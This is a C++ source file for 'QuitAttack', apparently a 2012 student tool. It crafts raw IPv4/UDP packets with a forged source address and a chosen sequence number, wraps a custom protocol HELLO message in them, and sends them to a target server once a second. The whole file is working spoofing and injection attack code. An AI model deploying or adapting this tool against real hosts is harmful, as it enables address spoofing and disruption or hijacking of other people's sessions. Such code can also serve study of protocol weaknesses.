//
//  main.cc
//  QuitAttack
//
//  Created by Elo Matias on 29.5.2012.
//  Copyright (c) 2012 student. All rights reserved.
//

#include <iostream>
#include <list>

#include <getopt.h>
#include <sys/stat.h>
#include <signal.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#include <arpa/inet.h>

#include "Message.hh"


#define HELP "Usage: QuitAttack [-c <client port>] [-p <server port>] [-n <seq num>] [-v <version>] -s <source> -t <target>"

#define MAX_CLIENT_ID 255
    
using namespace std;

/**
 * Interrupt handler
 */
void signalHandler(int signal);
void signalHandler(int signal){

    std::cout << "*** QuitAttack closing ***" << std::endl;
    exit(0);
}


/**
 * Pseudo header for calculating UDP checksum
 * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
 */
struct psd_udp {
	struct in_addr src;
	struct in_addr dst;
	unsigned char pad;
	unsigned char proto;
	unsigned short udp_len;
	struct udphdr udp;
};

/**
 * Calculate IP checksum
 * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
 */
unsigned short in_cksum(unsigned short *addr, int len);
unsigned short in_cksum(unsigned short *addr, int len){
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;
    
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
    
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

/**
 * Fills the UDP header and calculates the checksum
 * Source: http://www.enderunix.org/docs/en/rawipspoof/ 
 */
unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len);
unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len){
	struct psd_udp buf;
    
	memset(&buf, 0, sizeof(buf));
	buf.src.s_addr = src;
	buf.dst.s_addr = dst;
	buf.pad = 0;
	buf.proto = IPPROTO_UDP;
	buf.udp_len = htons(len);
	memcpy(&(buf.udp), addr, len);
	return in_cksum((unsigned short *)&buf, 12 + len);
}





int main (int argc, const char * argv[]){
    std::cout << "*** QuitAttack launched ***" << std::endl;
    
    //Default values
    string clientPort = "5063";
    string serverPort = "5062";
	int version = 1;
    uint32_t seqnum = 0;
    string target;
    string source;
    
	// Long versions of command line parameters
    static struct option long_options[] = {
		{"cport", 	required_argument, 	0, 'c'},
        {"sport", 	required_argument, 	0, 'p'},
        {"seqnum", 	required_argument, 	0, 'n'},
		{"version", required_argument, 	0, 'v'},
        {"target", required_argument, 	0, 't'},
		{"source", required_argument, 	0, 's'},
        {"help", 	no_argument, 		0, 'h'},
        {0, 0, 0, 0}
    };
	
    int c;
    opterr = 0;
    // Use get_opt to parse command line parameters
	while ((c = getopt_long (argc, (char **)argv, "hc:p:s:v:n:t:", long_options, NULL)) != -1){
        switch (c)
        {
            case 'c': // Client port
                clientPort = optarg;
                cout << "Client port: " << clientPort << endl;
                break;
            case 'p': // Server port
                serverPort = optarg;
                cout << "Server port: " << serverPort << endl;
                break;
            case 'v': // Protocol version
                version = atoi(optarg);
                if ((version < 1) || (version > 2) ) {
                    version = 1;
                }
                cout << "Protocol version: " << version << endl;
                break;
            case 'n': // Sequence number
                seqnum = atoi(optarg);
                cout << "Sequence number: " << seqnum << endl;
                break;
            case 't': // Target address
                target = optarg;
                cout << "Target address: " << target << endl;
                break;
            case 's': // Source address
                source = optarg;
                cout << "Source address: " << source << endl;
                break;
            case 'h': // Help
                cout << HELP << endl;
                break;
            case '?': // Help
                cout << HELP << endl;
                return 0;
            default:
                cout << "Default" << endl;
                return 0;
        }
    }
    
    // Check that target and source have been given
    if (target.empty()) {
        cout << "Target missing" << endl << HELP << endl;
        return 0;
    }
    if (source.empty()) {
        cout << "Source missing" << endl << HELP << endl;
        return 0;
    }   

    // Add SIGINT handler
    signal(SIGINT, signalHandler);
    
    
	char packet[2000];
    struct ip* ip = (struct ip *)packet;
	struct udphdr* udp= (struct udphdr*)(packet + sizeof(struct ip));
	int sd;
	const int on = 1;
	struct sockaddr_in sin;
    
    // Create attack message
    Message msg;
    msg.init(version, TYPE_HELLO);
    msg.setSeqnum(seqnum);
    //msg.printBytes();
    
    msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
    int pktLen = HEADER_SIZE + msg.getPayloadLength();

    // Total length
    // IP header + UDP header + payload
    int totLen = sizeof(struct ip) + sizeof(struct udphdr) + pktLen;
    
    // Fill the IP headers
    ip->ip_hl = 0x5;
	ip->ip_v = 0x4;
	ip->ip_tos = 0x0;
	ip->ip_len = totLen; // IP header + UDP header + payload
	ip->ip_id = htons(12830);
	ip->ip_off = 0x0;
	ip->ip_ttl = 64;
	ip->ip_p = IPPROTO_UDP;
	ip->ip_sum = 0x0;
	ip->ip_src.s_addr = inet_addr(source.c_str());
	ip->ip_dst.s_addr = inet_addr(target.c_str());
	ip->ip_sum = in_cksum((unsigned short *)packet, totLen);
    
    // Set UDP ports
    udp->uh_sport = htons(atoi(clientPort.c_str()));
    udp->uh_dport = htons(atoi(serverPort.c_str()));
    //udp.source = htons(atoi(clientPort.c_str()));
    //udp.dest = htons(atoi(serverPort.c_str()));
    
    // UDP datagram length
    udp->uh_ulen = htons(sizeof(struct udphdr) + pktLen); // UDP header + data, data still missing
    //udp.len = htons(8); // UDP header + data, data still missing

    // Calculate checksum
    udp->uh_sum = 0;
    //udp.check = 0;
	udp->uh_sum = in_cksum_udp(ip->ip_src.s_addr, ip->ip_dst.s_addr, (unsigned short *)udp, sizeof(&udp));

    // Create raw UDP socket
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("raw socket");
		exit(1);
	}

    // Socket options
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("setsockopt");
		exit(1);
	}

    
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip->ip_dst.s_addr;
        
    while (true) {
        cout << "." << flush;
        if (sendto(sd, packet, totLen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
            perror("sendto");
            exit(1);
        }
        sleep(1);
    }

	return 0;
}
